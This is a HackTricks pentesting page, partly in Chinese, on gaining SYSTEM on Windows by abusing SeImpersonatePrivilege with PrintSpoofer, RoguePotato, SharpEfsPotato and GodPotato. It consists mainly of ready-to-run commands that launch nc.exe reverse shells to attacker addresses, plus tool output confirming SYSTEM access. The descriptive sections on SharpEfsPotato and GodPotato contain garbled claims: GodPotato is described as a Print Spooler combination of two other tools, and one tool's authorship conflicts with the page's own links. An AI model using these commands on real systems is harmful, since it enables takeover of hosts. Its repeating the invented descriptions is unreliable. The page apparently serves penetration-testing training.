# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或者 [**telegram群组**](https://t.me/peass) 或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

{% hint style="warning" %}
**JuicyPotato在Windows Server 2019和Windows 10版本1809及以上不起作用**。然而，可以使用[**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**，**[**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**，**[**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**，**[**GodPotato**](https://github.com/BeichenDream/GodPotato)来**利用相同的权限并获得`NT AUTHORITY\SYSTEM`级别的访问权限**。这篇[博文](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)详细介绍了`PrintSpoofer`工具，该工具可用于在JuicyPotato不再起作用的Windows 10和Server 2019主机上滥用模拟权限。
{% endhint %}

## 快速演示

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
### RoguePotato

{% code overflow="wrap" %}
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
{% code %}

### SharpEfsPotato

SharpEfsPotato is a tool that leverages the EfsRpcOpenFileRaw function to perform a Local Privilege Escalation (LPE) attack on Windows systems. This attack exploits the EFS (Encrypting File System) service to gain SYSTEM-level privileges.

#### Usage

To use SharpEfsPotato, follow these steps:

1. Compile the C# code using a .NET compiler.
2. Execute the compiled binary on the target Windows system.

#### How it Works

SharpEfsPotato works by creating a named pipe and impersonating the SYSTEM account. It then calls the EfsRpcOpenFileRaw function to open a file with the desired privileges. By specifying the path of a target file, the tool triggers the EFS service to decrypt the file. During the decryption process, the tool intercepts the decrypted file and replaces it with a malicious payload. When the SYSTEM account accesses the file, the payload is executed, resulting in a Local Privilege Escalation.

#### Mitigation

To mitigate the risk of SharpEfsPotato attacks, consider the following measures:

- Apply the latest security patches and updates to the Windows operating system.
- Implement strong access controls and permissions on sensitive files and directories.
- Regularly monitor and review system logs for any suspicious activity.
- Restrict the use of privileged accounts and limit their access to critical systems and files.
- Disable unnecessary services and features that may introduce additional attack vectors.

#### References

- [https://github.com/itm4n/SharpEfsPotato](https://github.com/itm4n/SharpEfsPotato)

{% endcode %}
```
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### 神之土豆

The **GodPotato** technique is a local privilege escalation attack that takes advantage of the **Print Spooler** service in Windows operating systems. This technique combines two well-known tools: **RoguePotato** and **PrintSpoofer**.

#### RoguePotato

**RoguePotato** is a tool that exploits the **Distributed Component Object Model (DCOM)** to escalate privileges on Windows systems. It abuses the **NT AUTHORITY/SYSTEM** user's privileges to execute arbitrary code with elevated privileges.

#### PrintSpoofer

**PrintSpoofer** is a tool that abuses the **Print Spooler** service to escalate privileges on Windows systems. It takes advantage of the **ImpersonateNamedPipeClient** function to impersonate the **SYSTEM** user and execute arbitrary code with elevated privileges.

#### GodPotato Attack

The **GodPotato** attack combines the capabilities of **RoguePotato** and **PrintSpoofer** to escalate privileges on a Windows system. It first uses **RoguePotato** to gain access to the **NT AUTHORITY/SYSTEM** user's privileges. Then, it leverages **PrintSpoofer** to impersonate the **SYSTEM** user and execute arbitrary code with elevated privileges.

This attack can be used by an attacker who already has local access to a Windows system to escalate their privileges and gain full control over the system. It is important for system administrators to be aware of this attack and take appropriate measures to secure their systems.
```
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或者 [**Telegram群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
